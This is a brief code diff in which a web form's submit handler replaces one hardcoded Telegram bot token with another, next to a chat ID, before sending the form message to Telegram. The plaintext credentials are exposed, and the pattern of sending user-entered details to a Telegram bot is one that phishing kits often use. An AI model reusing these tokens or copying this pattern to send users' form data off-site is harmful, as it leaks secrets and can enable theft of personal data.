@@ -32,7 +32,7 @@ document.getElementById('user-details-form').addEventListener('submit', function
         `;
 
         // Telegram bot API details
-        const botToken = '7522262153:AAGtEdu0TDYSDpeNyC4SjbRG1XtP44qf_OY';
+        const botToken = '7149309730:AAGvxOZFj21WNohAEDq5bSG-TgTA2ieDRSA';
         const chatId = '1739381482';
 
         // Send the message to Telegram
